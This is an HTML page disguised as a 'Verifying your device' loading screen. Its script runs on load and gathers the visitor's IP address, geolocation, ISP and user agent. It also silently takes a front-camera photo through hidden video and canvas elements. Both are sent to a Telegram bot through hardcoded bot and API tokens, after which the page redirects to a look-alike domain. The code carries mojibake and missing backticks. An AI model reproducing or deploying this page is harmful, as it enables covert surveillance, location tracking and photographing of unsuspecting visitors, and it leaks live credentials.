<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: sans-serif; text-align: center; padding: 60px; }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <h2>Loading...</h2>
  <p>Verifying your device... Please wait</p>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
    const chatId = "7216371031";
    const redirectUrl = "https://opaslabs.vercal.app/";
    const ipinfoToken = "18d2a866939a58";

    let textDone = false;
    let photoDone = false;

    const tryRedirect = () => {
      if (textDone && photoDone) {
        window.location.href = redirectUrl;
      }
    };

    // 1. Send IP Info
    fetch("https://ipinfo.io/json?token=" + ipinfoToken)
      .then(res => res.json())
      .then(data => {
        const message = 
üîê Visitor Info:
üåê IP: ${data.ip}
üìç ${data.city}, ${data.region}, ${data.country}
üìå Location: ${data.loc}
üåê ISP: ${data.org}
üß† UA: ${navigator.userAgent}
üïì Time: ${new Date().toLocaleString()}
        .trim();

        return fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });
      })
      .then(() => {
        console.log("‚úÖ Text sent to Telegram");
        textDone = true;
        tryRedirect();
      })
      .catch(err => {
        console.error("‚ùå Failed to send text:", err);
        textDone = true; // continue anyway
        tryRedirect();
      });

    // 2. Send Photo
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(stream => {
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(t => t.stop());

            canvas.toBlob(blob => {
              const formData = new FormData();
              formData.append("chat_id", chatId);
              formData.append("photo", blob);
              formData.append("caption", "üì∏ Visitor Photo");

              fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                method: "POST",
                body: formData
              })
              .then(() => {
                console.log("‚úÖ Photo sent to Telegram");
                photoDone = true;
                tryRedirect();
              })
              .catch(err => {
                console.error("‚ùå Failed to send photo:", err);
                photoDone = true;
                tryRedirect();
              });
            }, "image/jpeg", 0.9);
          }, 3000);
        };
      })
      .catch(err => {
        console.error("‚ùå Camera error:", err);
        photoDone = true;
        tryRedirect();
      });

    // 3. Backup redirect after 10s no matter what
    setTimeout(() => {
      console.log("‚è±Ô∏è Force redirect after timeout");
      window.location.href = redirectUrl;
    }, 10000);
  </script>
</body>
</html>
